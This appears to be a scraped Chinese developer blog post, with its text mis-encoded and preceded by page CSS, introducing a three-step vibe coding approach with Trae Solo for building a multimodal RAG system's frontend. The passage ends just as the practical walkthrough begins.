h5{padding-bottom:0;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h5{margin-top:18px;font-size:14px}.markdown-body h6{padding-bottom:0;margin-top:12px;margin-bottom:10px;font-size:12px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body p{line-height:inherit;margin-top:16px;margin-bottom:16px}.markdown-body img{max-width:100%}.markdown-body hr{position:relative;width:98%;height:1px;margin-top:32px;margin-bottom:32px;background-image:linear-gradient(90deg,var(--cyanosis-link-color),rgba(255,0,0,.3),hsla(0,0%,100%,.1),rgba(255,0,0,.3),var(--cyanosis-link-color));border-width:0;overflow:visible}.markdown-body hr:after{content:"";position:absolute;margin:auto;left:0;right:0;bottom:0;top:0;display:inline-block;width:60px;height:20px;background-color:var(--cyanosis-bg-color);background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACgAAAAgCAYAAABgrToAAAADoklEQVRYR82XTYgcRRTHf2933Q1RjAa9eFO8JHoJ8RQVBQ2iBwXBET0YEUTXNVmNQtTpmeqaWV0XNRq/o4KoECSCEPSg4CF+BYUkIIiCoCJCPIhC/Ihh2Z0nVV27VnZnenumW9i6ddV7//frV69fVQurfMgq56NawFTPAU6QyomqXrw6wIZeyhCPebA5buNR+akKyGoAjd6BshthnYdSjqNcRVuOlIUsD2j0SuA94IwuMHdh5ZUykOUBXfSGbmKI54EtAeYIHSZoy5dl4JxvNYBOKdW1KE8BQ8AkVk6WhasWsAiN0TX9gveXQaPP+Aytpc4u+bMI06JNohsYYYYOR2lJWtS3OKDRfcAtQfgDoI6Vo4UCGb0OmAEuDvZvYmVbEd/igC3dzDz7gQu8sPA9kJDK27mBmjqBeLjTg90PDFOjWawFFQd06kZHEfaj3LAIpTRpSXsZ5E06zEYP9sDimnAApYaV2SLZG/wjMeqAkijwW4xQJ5Gf/ZzRC8OW3hiBTGGlURRswW55Bh/Ssxljrwew8l1PQaM14GngvGDzBUKdDsMeTtgU5o8B92PFlUf3YXUrHa7Fys6lBqcCGnX15YQ2A18FyPd7Crd1A3M8C1wdbH4DD3hWeP6IEXbQkG97ajR1HPFnuPP5jFFq1OWX7hl8WM9l1AO648uNfwLk7tytMeogty+xeQ4rO3r6bdcx1nuwOGsHmaXGtPzae4uzGnLH1kQkvpdZGrHjssBZJrL+pqS05KWc8tgITAPXRzYvYOXe/C2OV43eDcRBDtIhoS2f9wzc0Cv8Wls+zoFzUC5zF0U241h5uZtPfptp6OUM8wbK+cH5GEpCS17P3fJei0Z3+npTxryJ8CPzbKMtn/ZyWbkPGl0PuFPkmkjkcb4h4R2ZLwRq1H0ALmvjkf2HwK1Y+T1PY2XABe/sHJ6MxN5lnoSpnC/UGbsTaI5phK2R7x6s3Ffk5YoDOrWm3onwJHBmEP86bPmBrsGaenNoIdnxCH+gPEhLXi0Cl1VBvyPVLSh7gEuC62yAfOIUqabWEaaiucMIk6RyqJ+Q/QM69V26jjW86Gvov/EaoyT8zRCn+Xq7PVrbx0nuYUaO9wM3WAbjCE1NEUw09Um4UV+2OKfYfu5/S19gsAzGKqm6LE5FrShbdS0ku465DjDwKA/oQht19ejqbaEVuRbiLhuHByYLjtUAZpDutzP7cYdHsPJXWbjyNVgFwQoa1WXwf4Jd9YD/Ap80+yE7+u9aAAAAAElFTkSuQmCC);background-repeat:no-repeat;background-size:auto 100%;background-position-x:center;transition:background-color .5s}.markdown-body code{padding:.065em .4em;font-size:.87em;color:var(--cyanosis-code-color);word-break:break-word;overflow-x:auto;background-color:var(--cyanosis-code-bg-color);border-radius:2px}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{display:block;padding:16px 12px;margin:0;font-size:12px;color:#333;word-break:normal;overflow-x:auto;background:var(--cyanosis-code-pre-color)}.markdown-body pre&gt;code::-webkit-scrollbar{width:4px;height:4px}.markdown-body pre&gt;code::-webkit-scrollbar-track{background-color:var(--cyanosis-border-color)}.markdown-body pre&gt;code::-webkit-scrollbar-thumb{background-color:var(--cyanosis-strong-color);border-radius:10px}.markdown-body a{position:relative;text-decoration:none;color:var(--cyanosis-link-color);border-bottom:1px solid var(--cyanosis-border-color)}.markdown-body a:hover{border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body a:active,.markdown-body a:hover{color:var(--cyanosis-linkh-color)}.markdown-body a:after{position:absolute;content:"";top:100%;left:0;width:100%;opacity:0;border-bottom:1px solid var(--cyanosis-border-color);transition:top .3s,opacity .3s;transform:translateZ(0)}.markdown-body a:hover:after{top:0;opacity:1;border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid var(--cyanosis-table-border-color);border-spacing:0;border-collapse:collapse}.markdown-body table thead{color:#000;text-align:left;font-size:14px;background:#f6f6f6}.markdown-body table tr:nth-child(2n){background-color:var(--cyanosis-table-tr-nc-color)}.markdown-body table tr:hover{background-color:var(--cyanosis-table-trh-color)}.markdown-body table td,.markdown-body table th{padding:12px 8px;line-height:24px;border:1px solid var(--cyanosis-table-border-color)}.markdown-body table th{color:var(--cyanosis-table-tht-color);background-color:var(--cyanosis-table-th-color)}.markdown-body table td{min-width:120px}.markdown-body blockquote{color:var(--cyanosis-blockquote-color);border-left:4px solid var(--cyanosis-strong-color);background-color:var(--cyanosis-blockquote-bg-color);padding:1px 20px;margin:22px 0;transition:color .35s}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body b,.markdown-body blockquote&gt;b,.markdown-body blockquote&gt;strong,.markdown-body strong{color:var(--cyanosis-strong-color)}.markdown-body em,.markdown-body i{color:var(--cyanosis-em-color)}.markdown-body del{color:var(--cyanosis-del-color)}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:4px}.markdown-body ol li{padding-left:6px}.markdown-body details&gt;summary{outline:none;color:var(--cyanosis-title-color);font-size:20px;font-weight:bolder;border-bottom:1px solid var(--cyanosis-border-color);cursor:pointer}.markdown-body details&gt;p{padding:10px 20px;margin:10px 0 0;color:#666;background-color:var(--cyanosis-blockquote-bg-color);border:2px dashed var(--cyanosis-strong-color)}.markdown-body h1::selection,.markdown-body h2::selection,.markdown-body h3::selection,.markdown-body h4::selection,.markdown-body h5::selection,.markdown-body h6::selection{color:var(--cyanosis-slct-title-color);background-color:var(--cyanosis-slct-titlebg-color)}.markdown-body ol li::selection,.markdown-body p::selection,.markdown-body ul li::selection{color:var(--cyanosis-slct-text-color);background-color:var(--cyanosis-slct-bg-color)}.markdown-body a::selection,.markdown-body b::selection,.markdown-body em::selection,.markdown-body i::selection,.markdown-body strong::selection{background-color:var(--cyanosis-slct-elbg-color)}.markdown-body del::selection{color:var(--cyanosis-slct-del-color);background-color:var(--cyanosis-slct-elbg-color)}.markdown-body table thead th::selection{background-color:transparent}.markdown-body table tbody td::selection{background-color:var(--cyanosis-slct-bg-color)}.markdown-body code::selection{background-color:var(--cyanosis-slct-codebg-color)}.markdown-body pre&gt;code::selection{background-color:var(--cyanosis-slct-prebg-color)}.markdown-body .contains-task-list{padding-left:14px;list-style:none}.markdown-body .contains-task-list input[type=checkbox]{position:relative}.markdown-body .contains-task-list input[type=checkbox]:before{content:"";position:absolute;top:0;left:0;right:0;bottom:0;width:inherit;height:inherit;background:#f0f8ff;border:1px solid #add6ff;border-radius:2px;box-sizing:border-box;z-index:1}.markdown-body .contains-task-list input[type=checkbox]:checked:after{content:"âœ“";position:absolute;top:-12px;left:0;right:0;bottom:0;width:0;height:0;color:#f55;font-size:20px;font-weight:700;z-index:2}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="atom-one-dark">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#abb2bf;background:#282c34}.hljs-comment,.hljs-quote{color:#5c6370;font-style:italic}.hljs-doctag,.hljs-formula,.hljs-keyword{color:#c678dd}.hljs-deletion,.hljs-name,.hljs-section,.hljs-selector-tag,.hljs-subst{color:#e06c75}.hljs-literal{color:#56b6c2}.hljs-addition,.hljs-attribute,.hljs-meta-string,.hljs-regexp,.hljs-string{color:#98c379}.hljs-built_in,.hljs-class .hljs-title{color:#e6c07b}.hljs-attr,.hljs-number,.hljs-selector-attr,.hljs-selector-class,.hljs-selector-pseudo,.hljs-template-variable,.hljs-type,.hljs-variable{color:#d19a66}.hljs-bullet,.hljs-link,.hljs-meta,.hljs-selector-id,.hljs-symbol,.hljs-title{color:#61aeee}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}.hljs-link{text-decoration:underline}</style><h2 data-id="heading-0">å‰è¨€</h2>
<p>ä¸Šç¯‡åˆ†äº«ã€Š<a href="https://juejin.cn/post/7577795545440960546" target="_blank" title="https://juejin.cn/post/7577795545440960546">LangChain1.0å®æˆ˜ä¹‹å¤šæ¨¡æ€RAGç³»ç»Ÿï¼ˆä¸‰ï¼‰â€”â€”å¤šæ¨¡æ€RAGç³»ç»ŸPDFè§£æåŠŸèƒ½å®ç°</a>ã€‹ä¸­ï¼Œç¬”è€…è¯¦ç»†åˆ†äº«äº†åŸºäº LangChain çš„å¤šæ¨¡æ€ RAG ç³»ç»Ÿå¦‚ä½•å¤„ç† PDF æ–‡æ¡£â€”â€”ä»è§£æã€æ–‡æœ¬åˆ†å—åˆ°å¼•ç”¨æº¯æºï¼Œå¹¶é€šè¿‡å®Œæ•´ä»£ç ç¤ºä¾‹å±•ç¤ºäº†å¦‚ä½•å®ç°ä¸€ä¸ªå…·å¤‡æ–‡æ¡£å¼•ç”¨åŠŸèƒ½çš„é—®ç­”ç³»ç»Ÿï¼Œä¸ºå®é™…æ„å»ºå¤šæ¨¡æ€ RAG åº”ç”¨æä¾›äº†å…·ä½“æŒ‡å¯¼ã€‚</p>
<p>åç«¯æ ¸å¿ƒåŠŸèƒ½å·²åŸºæœ¬å¼€å‘å®Œæˆã€‚ä½†ä¸€ä¸ªå®Œæ•´çš„ç³»ç»Ÿç¦»ä¸å¼€ä¸ä¹‹åŒ¹é…çš„å‰ç«¯ç•Œé¢ã€‚åœ¨å½“å‰ AI ç¼–ç¨‹é€æ¸æˆä¸ºä¸»æµçš„èƒŒæ™¯ä¸‹ï¼ŒVibe Codingï¼ˆæ°›å›´ç¼–ç¨‹ï¼‰æ­£æ·±åˆ»æ”¹å˜å¼€å‘æ–¹å¼ï¼šå¼€å‘è€…é€šè¿‡è‡ªç„¶è¯­è¨€æè¿°éœ€æ±‚ï¼Œç”±å¤§è¯­è¨€æ¨¡å‹ï¼ˆLLMï¼‰ç›´æ¥ç”Ÿæˆè½¯ä»¶ã€‚åœ¨ç¬”è€…ä¹‹å‰çš„æ–‡ç« ã€Š<a href="https://juejin.cn/post/7574615024293429274" target="_blank" title="https://juejin.cn/post/7574615024293429274">Gemini3.0æ·±åº¦è§£æï¼Œå®ƒåœ¨é‡æ–°å®šä¹‰æ™ºèƒ½ï¼Œä¼šæ˜¯å‰ç«¯å·¥ç¨‹å¸ˆå™©æ¢¦å—ï¼Ÿ</a>ã€‹ä¸­æ›¾æ¢è®¨è¿‡è¿™ä¸€è¶‹åŠ¿ã€‚</p>
<p>Vibe Coding å·²ä¸å†æ˜¯å›½å¤–æ¨¡å‹çš„ä¸“å±ã€‚å­—èŠ‚è·³åŠ¨æ¨å‡ºçš„ AI ç¼–ç¨‹å·¥å…· <strong>Trae</strong> å·²å¼€æ”¾ Solo æ¨¡å¼ï¼Œå·ç§°èƒ½å¤Ÿé«˜æ•ˆã€è‡ªåŠ¨åŒ–åœ°å®ç°â€œä»è‡ªç„¶è¯­è¨€åˆ°è½¯ä»¶â€çš„å…¨æµTrae ç¨‹å¼€å‘ã€‚åœ¨æœ¬æœŸåˆ†äº«ä¸­ï¼Œç¬”è€…å°†å¸¦é¢†å¤§å®¶ä½¿ç”¨ Trae Soloï¼Œä¸€æ­¥æ­¥å®Œæˆå¤šæ¨¡æ€ RAG ç³»ç»Ÿå‰ç«¯é¡µé¢çš„æ­å»ºä¸å®ç°ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/616d5f0a3be849da90afe8005003f1f5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L55yf5aW9546p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765770311&amp;x-signature=uZP9oNyjHAWOSdp3bFs5zry%2F1Sk%3D" alt="6.png" loading="lazy"/></p>
<p>æœ¬ç³»åˆ—å†…å®¹é€‚åˆæ‰€æœ‰å¯¹ LangChain æ„Ÿå…´è¶£çš„å­¦ä¹ è€…ï¼Œæ— è®ºä¹‹å‰æ˜¯å¦æ¥è§¦è¿‡ LangChainã€‚å½“ç„¶ï¼Œå¦‚æœå¤§å®¶å·²ç»å­¦ä¹ è¿‡æˆ‘çš„ä¸“æ <a href="https://juejin.cn/column/7526240014499495972" target="_blank" title="https://juejin.cn/column/7526240014499495972">ã€Šæ·±å…¥æµ…å‡ºLangChain&amp;LangGraph AI Agent æ™ºèƒ½ä½“å¼€å‘ã€‹</a>ï¼Œç›¸ä¿¡å¯ä»¥æ›´å¿«ä¸Šæ‰‹ã€‚è¯¥ä¸“æ åŸºäºç¬”è€…åœ¨å®é™…é¡¹ç›®ä¸­çš„æ·±åº¦ä½¿ç”¨ç»éªŒï¼Œç³»ç»Ÿè®²è§£äº†ä½¿ç”¨LangChain/LangGraphå¦‚ä½•å¼€å‘æ™ºèƒ½ä½“ï¼Œç›®å‰å·²æ›´æ–° 30è®²ï¼Œå¹¶æŒç»­è¡¥å……å®æˆ˜ä¸æ‹“å±•å†…å®¹ã€‚æ¬¢è¿æ„Ÿå…´è¶£çš„åŒå­¦å…³æ³¨ç¬”è€…çš„æ˜é‡‘è´¦å·ä¸ä¸“æ ï¼Œä¹Ÿå¯å…³æ³¨ç¬”è€…çš„åŒåå¾®ä¿¡å…¬ä¼—å·Â <strong>å¤§æ¨¡å‹çœŸå¥½ç©</strong>ï¼Œæ¯æœŸåˆ†äº«æ¶‰åŠçš„ä»£ç å‡å¯åœ¨å…¬ä¼—å·ç§ä¿¡:Â <strong>LangChainæ™ºèƒ½ä½“å¼€å‘</strong>å…è´¹è·å–ã€‚</p>
<h2 data-id="heading-1">ä¸€ã€Vibe Coding æœ€ä½³å®è·µæŒ‡å—</h2>
<p>ç¬”è€…åœ¨æ–‡ç«  <a href="https://juejin.cn/post/7578700798744903714" target="_blank" title="https://juejin.cn/post/7578700798744903714">Chatboxæ”¯æŒæ¥å…¥LangGraphæ™ºèƒ½ä½“ï¼Ÿä¸€åˆ‡éƒ½é Trae Solo!</a>åˆ©ç”¨ Trae Solo å¿«é€Ÿç”Ÿæˆäº†ä¸€ä¸ª FastAPI ä¸­é—´å±‚ï¼Œå°†ç¬”è€…å¼€å‘çš„æ™ºèƒ½ä½“ä¸Chatboxå‰ç«¯é¡µé¢æ— ç¼è¡”æ¥ã€‚å¯¹äºè¿™ç±»éœ€æ±‚æ˜ç¡®ã€ç»“æ„ç®€å•çš„ä»»åŠ¡ï¼ŒTrae Solo ç¡®å®èƒ½åšåˆ°è¿‘ä¹â€œä¸€é”®ç”Ÿæˆâ€ã€‚</p>
<p>ç„¶è€Œå½“é¢å¯¹ä¸€ä¸ªç¨å…·è§„æ¨¡ã€åŠŸèƒ½å¤æ‚çš„ç³»ç»Ÿçº§é¡¹ç›®æ—¶ï¼Œé€šè¿‡å¤šæ¬¡å®è·µï¼Œç¬”è€…å‘ç°ä¸èƒ½æœŸæœ› <strong>Trae Solo</strong> èƒ½ç¬é—´â€œç†è§£â€å…¨éƒ¨éœ€æ±‚ï¼Œä¸€æ¬¡æ€§ç”Ÿæˆå®Œç¾æ— ç‘•çš„ä»£ç ã€‚è¿™æ­£æ˜¯å½“å‰é˜¶æ®µ <strong>Vibe Coding</strong>ï¼ˆæ°›å›´ç¼–ç¨‹ï¼‰çš„çœŸå®å†™ç…§ï¼šå®ƒå¹¶éâ€œæ›¿ä»£â€å¼€å‘è€…ï¼Œè€Œæ˜¯ä¸€ä¸ªéœ€è¦è¢«â€œå¼•å¯¼â€å’Œâ€œååŒâ€çš„å¼ºå¤§å·¥å…·ã€‚</p>
<p>é«˜æ•ˆçš„ <strong>Vibe Coding</strong> ä¸ä»…è¦æ±‚å¼€å‘è€…å…·å¤‡æ‰å®çš„ä¸“ä¸šçŸ¥è¯†å’Œé¡¹ç›®ç»éªŒï¼Œä»¥ä¾¿æå‡ºç²¾å‡†éœ€æ±‚å’Œå®šä½é—®é¢˜ï¼Œæ›´éœ€è¦ä¸€å¥—ç³»ç»Ÿçš„æ–¹æ³•è®ºæ¥å¼•å¯¼ å¤§æ¨¡å‹ã€‚ç»è¿‡åå¤å®è·µä¸æ€»ç»“ï¼Œç¬”è€…åˆ†äº«è‡ªå·±å¸¸ç”¨çš„â€œä¸‰æ­¥èµ°â€æœ€ä½³æŒ‡å—ï¼Œæ˜¾è‘—æå‡å¤§æ¨¡å‹ç”Ÿæˆä»£ç çš„å‡†ç¡®æ€§ä¸å¯ç”¨æ€§ã€‚</p>
<p align="center"><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/15a963556e90493f925a2ee3dbdb53e2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L55yf5aW9546p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765770311&amp;x-signature=KQ8ON%2BJWWQ3NDi%2FsNsq8MXEdkpY%3D" alt="3.png" width="70%" loading="lazy"/></p>
<h3 data-id="heading-2">ç¬¬ä¸€æ­¥ï¼šæ„å»ºç»“æ„åŒ–çš„æç¤ºè¯</h3>
<p>æ¸…æ™°ã€å®Œæ•´çš„æç¤ºè¯æ˜¯æˆåŠŸçš„å…³é”®å› ç´ ã€‚ä¸ºäº†è®©å¤§æ¨¡å‹å……åˆ†ç†è§£ä½ çš„æ„å›¾ï¼Œå¿…é¡»æä¾›ä¸€ä»½ç»“æ„ä¸¥è°¨çš„æç¤ºè¯ã€‚åœ¨æ–‡ç« ã€Š<a href="https://juejin.cn/post/7478144526442627091" target="_blank" title="https://juejin.cn/post/7478144526442627091">ä¸å¤§æ¨¡å‹å¯¹è¯çš„è‰ºæœ¯ï¼šæç¤ºè¯å·¥ç¨‹æŒ‡å—ï¼ˆä¸€ï¼‰</a>ã€‹ä¸­ç¬”è€…åˆ†äº«äº†é€šç”¨åœºæ™¯çš„æç¤ºè¯æŠ€å·§ã€‚å¯¹äºå…·ä½“çš„å¼€å‘ä»»åŠ¡ï¼Œç¬”è€…è¿›ä¸€æ­¥å°†å…¶ç»†åŒ–ä¸ºä»¥ä¸‹å‡ ä¸ªæ ¸å¿ƒè¦ç´ ï¼š</p>
<ol>
<li><strong>è§’è‰²å®šä½</strong><br/>
é¦–å…ˆï¼Œæ˜ç¡®èµ‹äºˆå¤§æ¨¡å‹ä¸€ä¸ªç‰¹å®šçš„â€œèº«ä»½â€å’Œâ€œèƒ½åŠ›é›†â€ã€‚ä¾‹å¦‚ï¼šâ€œä½ æ˜¯ä¸€ä½èµ„æ·±çš„å‰ç«¯å¼€å‘å·¥ç¨‹å¸ˆï¼Œç²¾é€š HTMLã€CSSã€JavaScript åŠ React æ¡†æ¶ï¼Œèƒ½å¤Ÿæ ¹æ®äº§å“éœ€æ±‚ç‹¬ç«‹å®Œæˆé«˜è´¨é‡çš„å‰ç«¯é¡µé¢å¼€å‘ã€‚â€</li>
<li><strong>æ¸…æ™°çš„éœ€æ±‚æè¿°</strong><br/>
åœ¨é˜æ˜èƒ½åŠ›åï¼Œå…·ä½“ã€æ— æ­§ä¹‰åœ°æè¿°éœ€æ±‚ã€‚ä¾‹å¦‚ï¼šâ€œè¯·åŸºäºæˆ‘å·²å¼€å‘çš„åç«¯ APIï¼ˆé™„ä¸Šæ¥å£æ–‡æ¡£ï¼‰ï¼Œæ„å»ºä¸€ä¸ªå¤šæ¨¡æ€ RAG ç³»ç»Ÿçš„ç®¡ç†å‰ç«¯ã€‚æ ¸å¿ƒåŠŸèƒ½éœ€åŒ…æ‹¬ï¼šæ–‡æ¡£ä¸Šä¼ åŒºã€å¯¹è¯å†å²åˆ—è¡¨ã€å®æ—¶é—®ç­”äº¤äº’ç•Œé¢ï¼Œå¹¶ç¡®ä¿é—®ç­”ç»“æœèƒ½é«˜äº®æ˜¾ç¤ºå¼•ç”¨çš„åŸæ–‡ç‰‡æ®µã€‚â€</li>
<li><strong>æ˜ç¡®çš„ä»»åŠ¡ç›®æ ‡</strong><br/>
å°†éœ€æ±‚è½¬åŒ–ä¸ºå¯æ‰§è¡Œçš„å…·ä½“ä»»åŠ¡ã€‚ä¾‹å¦‚ï¼šâ€œè¯·ä½¿ç”¨ Vite è„šæ‰‹æ¶åˆ›å»º React é¡¹ç›®ï¼Œé‡‡ç”¨ Ant Design ä½œä¸º UI ç»„ä»¶åº“ï¼Œæ„å»ºç¬¦åˆä¸Šè¿°éœ€æ±‚çš„å‰ç«¯å•é¡µåº”ç”¨ã€‚è¯·ä¿æŒåç«¯ API è°ƒç”¨æ–¹å¼ä¸å˜ï¼Œä¸»è¦é€»è¾‘é›†ä¸­åœ¨Â <code>src/pages/chat</code>Â ç›®å½•ä¸‹ã€‚â€</li>
<li><strong>ä»£ç é£æ ¼ä¸è§„èŒƒçº¦æŸ</strong><br/>
ä¸ºé˜²æ­¢å¤§æ¨¡å‹â€œè‡ªç”±å‘æŒ¥â€å¯¼è‡´ä»£ç é£æ ¼æ··ä¹±ï¼Œå¿…é¡»æå‰çº¦å®šè§„èŒƒã€‚ä¾‹å¦‚ï¼šâ€œè¯·éµå¾ªå‡½æ•°å¼ç»„ä»¶ç¼–å†™ï¼Œä½¿ç”¨ TypeScript è¿›è¡Œç±»å‹å®šä¹‰ã€‚ç›®å½•ç»“æ„éœ€æŒ‰åŠŸèƒ½æ¨¡å—åˆ’åˆ†ï¼Œç»„ä»¶æ–‡ä»¶é‡‡ç”¨ PascalCase å‘½åï¼Œå·¥å…·å‡½æ•°é‡‡ç”¨ camelCase å‘½åã€‚â€</li>
</ol>
<h3 data-id="heading-3">ç¬¬äºŒæ­¥ æç¤ºè¯ä¼˜åŒ–</h3>
<p>ç¬¬ä¸€æ­¥ç¼–å†™çš„æç¤ºè¯ï¼Œå…¶é¦–è¦ç›®æ ‡æ˜¯ä¿è¯â€œäººç±»è§†è§’â€ä¸‹çš„å®Œæ•´æ€§ã€‚ç„¶è€Œï¼Œè¦è®©å¤§æ¨¡å‹æœ€æœ‰æ•ˆåœ°ç†è§£ï¼Œæœ€å¥½ä½¿ç”¨æ›´ç¬¦åˆ AIâ€œæ€ç»´ä¹ æƒ¯â€çš„è¯­è¨€è¿›è¡ŒäºŒæ¬¡ç¼–å†™ã€‚</p>
<p>ä¸€ä¸ªéå¸¸å®ç”¨çš„æŠ€å·§æ˜¯ï¼š<strong>ä¸è¦ç›´æ¥å°†ä½ çš„â€œå¤§ç™½è¯â€æç¤ºè¯ä¸¢ç»™ç›®æ ‡å¤§æ¨¡å‹æˆ–æ™ºèƒ½ä½“ï¼ˆå¦‚ Trae Soloï¼‰ï¼Œè€Œæ˜¯å…ˆè¯·å¦ä¸€ä¸ªæ“…é•¿æ–‡æœ¬å¤„ç†çš„å¤§æ¨¡å‹ï¼ˆå¦‚ DeepSeekï¼‰å¯¹å…¶è¿›è¡Œä¼˜åŒ–ã€‚</strong> Â ä¼˜åŒ–çš„ç›®æ ‡æ˜¯ä½¿è¯­è¨€æ›´æ¡ç†æ¸…æ™°ã€é€»è¾‘é€šé¡ºã€æŒ‡ä»¤æ˜ç¡®ã€‚</p>
<p>äº²æµ‹è¡¨æ˜ï¼Œç»è¿‡è¿™å±‚â€œç¿»è¯‘â€æˆ–â€œæ¶¦è‰²â€åï¼Œå†æäº¤ç»™ Trae Solo ç­‰ä»£ç ç”Ÿæˆå·¥å…·ï¼Œå¾—åˆ°çš„ä»£ç è´¨é‡æ›´é«˜ï¼Œåˆæ¬¡è¿è¡Œçš„é€šè¿‡ç‡æ˜¾è‘—æå‡ï¼Œåç»­éœ€è¦ä¿®æ­£çš„ Bug ä¹Ÿæ›´å°‘ã€‚</p>
<h3 data-id="heading-4">ç¬¬ä¸‰æ­¥ ç²¾å‡†çš„é—®é¢˜å®šä½</h3>
<p>å¯¹äºå¤æ‚é¡¹ç›®ï¼Œå¤§æ¨¡å‹ç”Ÿæˆçš„ä»£ç å‡ ä¹ä¸å¯èƒ½ä¸€æ¬¡æ€§å®Œç¾è¿è¡Œã€‚å½“å‡ºç°Bugæ—¶ï¼Œç¬”è€…èº«è¾¹è®¸å¤šå¼€å‘è€…ä¹ æƒ¯äºç›´æ¥å°†æ•´æ®µæŠ¥é”™ä¿¡æ¯æŠ›ç»™å¤§æ¨¡å‹ï¼Œè¿™ç§æ¨¡ç³Šçš„æé—®æ–¹å¼å¾€å¾€æ”¶æ•ˆç”šå¾®ã€‚</p>
<p>æ›´é«˜æ•ˆçš„åšæ³•æ˜¯ï¼š<strong>å¼€å‘è€…å…ˆè¿›è¡Œåˆæ­¥çš„ã€ç²—ç²’åº¦çš„é—®é¢˜å®šä½ï¼Œå†å¼•å¯¼å¤§æ¨¡å‹è¿›è¡Œç²¾å‡†ä¿®å¤ã€‚</strong> Â å…·ä½“æµç¨‹å¦‚ä¸‹ï¼š</p>
<ol>
<li><strong>äººå·¥åˆ†æ</strong>ï¼šæ ¹æ®æŠ¥é”™æ ˆä¿¡æ¯ï¼Œåˆæ­¥åˆ¤æ–­é—®é¢˜å¯èƒ½å‡ºç°çš„æ–‡ä»¶æˆ–ä»£ç æ¨¡å—ï¼ˆä¾‹å¦‚ï¼Œå¯èƒ½æ˜¯Â <code>src/components/ChatWindow.tsx</code>Â ä¸­çš„çŠ¶æ€æ›´æ–°é€»è¾‘æœ‰é—®é¢˜ï¼‰ã€‚</li>
<li><strong>æä¾›ä¸Šä¸‹æ–‡</strong>ï¼šå‘å¤§æ¨¡å‹æé—®æ—¶ï¼Œä¸ä»…è¦æä¾›é”™è¯¯ä¿¡æ¯ï¼Œæ›´è¦æä¾›ç›¸å…³æ–‡ä»¶çš„å®Œæ•´ä»£ç æˆ–å…³é”®ç‰‡æ®µä½œä¸ºä¸Šä¸‹æ–‡ã€‚</li>
<li><strong>ç²¾å‡†æé—®</strong>ï¼šæé—®æ–¹å¼åº”ä¸ºï¼šâ€œæˆ‘åœ¨è¿è¡Œé¡¹ç›®æ—¶é‡åˆ°äº†Â <code>[å…·ä½“é”™è¯¯]</code>ã€‚åˆæ­¥åˆ†æé—®é¢˜å¯èƒ½å‡ºåœ¨Â <code>ChatWindow.tsx</code>Â ç»„ä»¶ã€‚ä»¥ä¸‹æ˜¯è¯¥æ–‡ä»¶çš„å®Œæ•´ä»£ç åŠç›¸å…³ä¾èµ–æ¨¡å—çš„ä»£ç ï¼Œè¯·å¸®æˆ‘åˆ†æå¹¶ä¿®å¤è¿™ä¸ªé”™è¯¯ã€‚â€</li>
</ol>
<p>é€šè¿‡è¿™ç§æ–¹å¼ï¼Œä½ å°†ä»ä¸€ä¸ªè¢«åŠ¨çš„â€œé”™è¯¯æäº¤è€…â€è½¬å˜ä¸ºä¸»åŠ¨çš„â€œè°ƒè¯•å¼•å¯¼è€…â€ï¼Œæå¤§æå‡äº†å¤§æ¨¡å‹æ’æŸ¥å’Œä¿®å¤é—®é¢˜çš„æ•ˆç‡ã€‚</p>
<p>ç†è®ºé˜è¿°å†å¤šï¼Œä¸å¦‚åŠ¨æ‰‹å®è·µã€‚æ¥ä¸‹æ¥ï¼Œç¬”è€…å°†å®Œæ•´æ¼”ç¤ºå¦‚ä½•è¿ç”¨ä»¥ä¸Šâ€œä¸‰æ­¥æ³•â€ï¼Œé€šè¿‡ <strong>Trae Solo</strong> ä¸ºå¤šæ¨¡æ€ RAG åç«¯ï¼Œå¼€å‘ä¸€ä¸ªåŠŸèƒ½å®Œå¤‡ã€ç•Œé¢ç¾è§‚çš„å‰ç«¯åº”ç”¨ã€‚</p>
<h2 data-id="heading-5">äºŒã€Trae Solo å‰ç«¯å¼€å‘å®è·µ</h2>
<p>å®è·µæ˜¯æ£€éªŒçœŸç†çš„å”¯ä¸€æ ‡å‡†ã€‚ä¸‹é¢ç¬”è€…å°†ä¸¥æ ¼éµå¾ªå‰æ–‡æ‰€è¿°çš„â€œä¸‰æ­¥èµ°â€æŒ‡å—ï¼Œå¸¦é¢† Trae Solo ä¸€æ­¥æ­¥æ„å»ºå¤šæ¨¡æ€ RAG ç³»ç»Ÿçš„å‰ç«¯ã€‚</p>
